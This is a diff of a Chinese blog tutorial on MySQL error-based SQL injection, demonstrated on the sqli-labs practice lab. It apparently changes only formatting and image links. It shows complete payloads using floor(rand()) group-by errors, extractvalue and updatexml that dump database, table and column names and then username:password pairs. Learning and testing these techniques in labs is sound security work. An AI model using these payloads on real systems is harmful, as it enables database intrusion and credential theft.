@@ -31,7 +31,7 @@
 <td align="center"></td>
 </tr>
 </tbody></table>
-<p><em>接着进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0，在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值（即再进行一次floor运算，结果为1），取到了1，将之插入，并将count(\</em>)置1。*</p>
+<p><em>接着进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0，在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值（即再进行一次floor运算，结果为1），取到了1，将之插入，并将count(<strong>*</strong>)置1。</em></p>
 <table>
 <thead>
 <tr>
@@ -52,7 +52,7 @@
 <td align="center"></td>
 </tr>
 </tbody></table>
-<p><em>继续进行group by floor(rand(0)*2),由于这是第三次运算，所以floor(rand(0)*2)的值为1，刚好表中已有key为1的数据，所以直接在count(\</em>)处加上1即可。*</p>
+<p><em>继续进行group by floor(rand(0)*2),由于这是第三次运算，所以floor(rand(0)*2)的值为1，刚好表中已有key为1的数据，所以直接在count(<strong>*</strong>)处加上1即可。</em></p>
 <table>
 <thead>
 <tr>
@@ -73,10 +73,10 @@
 <td align="center"></td>
 </tr>
 </tbody></table>
-<p><em>继续进行group by floor(rand(0)*2)的操作，现在已经是第四次floor运算，所以现在值为0，继续在表中找key为0的数据，发现没有这个数据，所以应当插入一条新的数据，此时重复第一次group by，这时的key值为1,并将count(\</em>)的值设为1。可是表中现在已经存在key为1的数据，故此时抛出主键冗余的异常。*</p>
+<p><em>继续进行group by floor(rand(0)*2)的操作，现在已经是第四次floor运算，所以现在值为0，继续在表中找key为0的数据，发现没有这个数据，所以应当插入一条新的数据，此时重复第一次group by，这时的key值为1,并将count(<strong>*</strong>)的值设为1。可是表中现在已经存在key为1的数据，故此时抛出主键冗余的异常。</em></p>
 <h3 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
 <p><em>爆库：</em></p>
-<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540074900.png" alt="1571540074900"></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545631.48.png" alt=""></p>
 <p><em>爆表：</em></p>
 <pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from
 information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540382.23.png" alt=""></p>
@@ -84,7 +84,7 @@ information_schema.tables group by x) as a)--+</code></pre><p><img src="https://
 <pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x23,floor(rand(0)*2)) as x from
 information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540628.93.png" alt=""></p>
 <p><em>爆字段：</em></p>
-<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540743913.png" alt="1571540743913"></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545733.87.png" alt=""></p>
 <h2 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h2><p><strong>Extractvalue(xml_frag,xpath_expr)函数使用XPath表示法从XML字符串中提取值</strong></p>
 <p>​        <strong>xml_frag:目标xml文档</strong></p>
 <p>​        <strong>xpath_expr:利用xpath路径法表示的查找路径</strong></p>
@@ -95,11 +95,11 @@ information_schema.tables group by x) as a)--+</code></pre><p><img src="https://
 <p><em>爆库：</em></p>
 <pre><code>id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571542339.7.png" alt=""></p>
 <p><em>爆表：</em></p>
-<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571542436964.png" alt="1571542436964"></p>
+<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545815.1.png" alt=""></p>
 <p><em>爆列：</em></p>
-<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543826518.png" alt="1571543826518"></p>
+<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545896.07.png" alt=""></p>
 <p><em>爆字段：</em></p>
-<pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543917259.png" alt="1571543917259"></p>
+<pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571545937.95.png" alt=""></p>
 <h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>updatexml(XML_document,XPath_String,new_value)函数，返回替换的xml片段</strong></p>
 <p>​        <strong>XML_document：XML文档的名称，为string格式</strong></p>
 <p>​        <strong>XPath_String：XPath格式的字符串</strong></p>
@@ -109,11 +109,11 @@ information_schema.tables group by x) as a)--+</code></pre><p><img src="https://
 <p><em>爆库：</em></p>
 <pre><code>id=1&#39; and updatexml(1,concat(0x23,version(),user()),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544448.8.png" alt=""></p>
 <p><em>爆表：</em></p>
-<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544555174.png" alt="1571544555174"></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571546006.77.png" alt=""></p>
 <p><em>爆列：</em></p>
 <pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544642.63.png" alt=""></p>
 <p><em>爆字段：</em></p>
-<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544707490.png" alt="1571544707490"></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571546058.19.png" alt=""></p>
 ]]></content>
       <categories>
         <category>web安全 - SQL注入</category>
